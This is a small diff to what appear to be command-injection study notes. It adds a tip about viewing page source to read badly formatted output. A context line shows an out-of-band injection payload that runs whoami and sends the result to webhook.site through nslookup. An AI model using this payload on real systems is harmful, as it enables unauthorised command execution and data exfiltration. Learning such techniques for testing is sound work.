@@ -729,3 +729,11 @@ how it works:
 ```bash
 & nslookup webhook.site/<id>?`whoami` &     -->  out of band testing
 ```
+
+>[!tips]
+>if you have a bad formatted output
+>=>
+>press CTRL+U in the page to see -->  the source code
+>=>
+>to see also better -->  the output
+
